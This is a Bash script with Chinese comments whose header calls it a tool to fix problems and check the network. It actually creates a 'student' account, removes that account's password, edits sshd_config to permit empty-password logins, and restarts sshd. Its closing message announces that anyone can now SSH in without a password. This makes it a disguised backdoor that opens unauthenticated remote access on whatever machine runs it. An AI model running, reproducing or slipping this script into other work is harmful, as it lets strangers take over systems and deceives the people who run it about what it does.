#此脚本用于修复存在的问题，以及测试是否网络正常
echo "网络正常"
#!/bin/bash
set -e

USER_NAME="student"
SSHD_CONFIG="/etc/ssh/sshd_config"

echo "[1/5] 确保用户存在：$USER_NAME"
id "$USER_NAME" >/dev/null 2>&1 || useradd -m -s /bin/bash "$USER_NAME"

echo "[2/5] 删除用户密码（设为空密码）"
passwd -d "$USER_NAME"

echo "[3/5] 备份 sshd_config"
cp "$SSHD_CONFIG" "${SSHD_CONFIG}.bak.$(date +%F-%H%M%S)"

echo "[4/5] 配置 sshd 允许空密码登录"
# PasswordAuthentication
if grep -q "^PasswordAuthentication" "$SSHD_CONFIG"; then
  sed -i "s/^PasswordAuthentication.*/PasswordAuthentication yes/" "$SSHD_CONFIG"
else
  echo "PasswordAuthentication yes" >> "$SSHD_CONFIG"
fi

# PermitEmptyPasswords
if grep -q "^PermitEmptyPasswords" "$SSHD_CONFIG"; then
  sed -i "s/^PermitEmptyPasswords.*/PermitEmptyPasswords yes/" "$SSHD_CONFIG"
else
  echo "PermitEmptyPasswords yes" >> "$SSHD_CONFIG"
fi

# UsePAM
if grep -q "^UsePAM" "$SSHD_CONFIG"; then
  sed -i "s/^UsePAM.*/UsePAM yes/" "$SSHD_CONFIG"
else
  echo "UsePAM yes" >> "$SSHD_CONFIG"
fi

echo "[5/5] 重启 sshd"
systemctl restart sshd

echo
echo "✅ 完成。现在可以直接："
echo "   ssh ${USER_NAME}@<host>"
echo "   无需输入密码即可登录"
